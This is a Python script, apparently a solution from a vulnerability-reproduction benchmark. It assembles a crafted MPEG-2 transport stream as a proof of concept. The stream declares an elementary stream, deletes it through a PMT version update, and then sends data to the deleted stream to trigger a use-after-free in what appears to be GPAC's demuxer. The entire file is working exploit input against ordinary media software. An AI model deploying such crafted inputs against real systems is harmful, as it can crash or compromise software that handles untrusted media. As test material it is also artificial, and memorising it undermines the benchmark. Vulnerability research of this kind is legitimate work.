import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to calculate MPEG-2 CRC32
        def mpeg2_crc(data):
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= (byte << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
                    else:
                        crc = (crc << 1) & 0xFFFFFFFF
            return crc

        # Helper to build a 188-byte TS packet
        def make_packet(pid, payload, counter, pusi=False):
            # Sync byte (0x47)
            header = 0x47000000
            # PUSI flag
            if pusi:
                header |= 0x400000
            # PID (13 bits)
            header |= (pid & 0x1FFF) << 8
            # Adaptation Control (01 = payload only) + Continuity Counter (4 bits)
            header |= 0x10 | (counter & 0x0F)
            
            pkt = bytearray(struct.pack('>I', header))
            pkt.extend(payload)
            
            # Padding with 0xFF to reach 188 bytes
            pad = 188 - len(pkt)
            if pad > 0:
                pkt.extend(b'\xff' * pad)
            return bytes(pkt)

        # PoC Construction:
        # Sequence:
        # 1. PAT: Maps Program 1 to PMT PID 0x100.
        # 2. PMT (Ver 0): Defines ES (StreamType 0x11) at PID 0x101.
        # 3. Data (PID 0x101): Valid payload to allocate ES resources.
        # 4. Data (PID 0x101): Continuation.
        # 5. PMT (Ver 1): Updates Program 1, removing ES 0x101. This triggers gf_m2ts_es_del.
        # 6. Data (PID 0x101): Arrives after deletion. If cleanup is flawed, triggers Use-After-Free.

        # Packet 1: PAT
        # ID 0x00, Len 13 (0x0D), TSID 1, Ver 0, Sec 0/0, Prog 1 -> PID 0x100
        pat_data = bytearray([
            0x00, 0xB0, 0x0D, 0x00, 0x01, 0xC1, 0x00, 0x00, 
            0x00, 0x01, 0xE1, 0x00
        ])
        pat_crc = mpeg2_crc(pat_data)
        pat_data.extend(struct.pack('>I', pat_crc))
        # PUSI=1, so payload starts with pointer field 0x00
        pkt1 = make_packet(0, b'\x00' + pat_data, 0, True)

        # Packet 2: PMT Version 0 (PID 0x100)
        # ID 0x02, Len 18 (0x12), Prog 1, Ver 0, PCR 0x101, InfoLen 0
        # Stream: Type 0x11 (MPEG-4 Systems), PID 0x101, InfoLen 0
        pmt0_data = bytearray([
            0x02, 0xB0, 0x12, 0x00, 0x01, 0xC1, 0x00, 0x00, 
            0xF1, 0x01, 0xF0, 0x00, 
            0x11, 0xE1, 0x01, 0xF0, 0x00
        ])
        pmt0_crc = mpeg2_crc(pmt0_data)
        pmt0_data.extend(struct.pack('>I', pmt0_crc))
        pkt2 = make_packet(0x100, b'\x00' + pmt0_data, 0, True)

        # Packet 3: ES Data (PID 0x101)
        # PES Header: 00 00 01 E0 (Video) ...
        data3 = b'\x00\x00\x01\xE0\x00\x00' + b'\xAA' * 20
        pkt3 = make_packet(0x101, data3, 0, True)

        # Packet 4: ES Data Continuation (PID 0x101)
        pkt4 = make_packet(0x101, b'\xBB' * 20, 1, False)

        # Packet 5: PMT Version 1 (PID 0x100) - DELETE ES
        # ID 0x02, Len 13 (0x0D), Prog 1, Ver 1 (0xC3), PCR 0x101, InfoLen 0, NO STREAMS
        pmt1_data = bytearray([
            0x02, 0xB0, 0x0D, 0x00, 0x01, 0xC3, 0x00, 0x00, 
            0xF1, 0x01, 0xF0, 0x00
        ])
        pmt1_crc = mpeg2_crc(pmt1_data)
        pmt1_data.extend(struct.pack('>I', pmt1_crc))
        pkt5 = make_packet(0x100, b'\x00' + pmt1_data, 1, True)

        # Packet 6: ES Data (PID 0x101) - Use After Free Trigger
        pkt6 = make_packet(0x101, b'\xCC' * 20, 2, False)

        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6